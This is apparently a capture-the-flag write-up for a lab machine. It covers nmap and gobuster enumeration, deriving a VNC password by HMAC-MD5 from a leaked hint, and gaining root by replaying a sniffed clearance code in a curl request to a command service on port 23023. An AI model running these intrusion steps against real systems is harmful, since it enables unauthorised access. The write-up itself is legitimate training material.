Started with a nmap scan
```
80 Apache 2.4.41
5901 VNC
23023 unknown http server 
```
Started a nikto scan on the webserver port `80` 

Doing a gobuster on the port `80` 
```
/index.html
/terrorism.html
/threats.html
/datacubes
/badactors
```
Gobuster for `/datacubes/` on port `80` 
```
/0000
/0103
/0011
/0068
/0233
/0451
```
Did a gobuster for the folder `/0000` found nothing
The `/datacubes` was found in the robots.txt file on the main webhost it says we should not be able to see clear txt creds
On the port `23023` the webpage is just a txt file and has a possible username `ANGEL/OA` it also says its a command/control 

After fuzzing for a while I finally found the message for the way in the message says the username is `jacobson` and the message says `smashth....e` hmac'ed with my username from the bad actors list use MD5 for the hmac hashing algo first 8 characters of the final hash is the VNC password -JL 
Looking at the badactors list found one username that's a JL name `jlebedev` 
Now we go to cyberchef and use the hmac and for the key use `smashth.....e` and the username as the message and copy the first 8 characters and we can log into the vnc with this password 
`311.....`
`vncviwer 10.10.233.4::5901` 
And we can get the user flag from the desktop
Now time to go for root on the desktop there is a go file called `badactors-list` when we run it it shows the bad actors list of usernames but in the background its making a HTTP request that shows the clearance code `7gFfT74scCg.......u` so now we can use curl and send a request to the server on port `23023` 
`curl -H 'Clearance-Code: [redacted]' -d 'directive=command' 10.10.233.4:23023` 
and now we have root
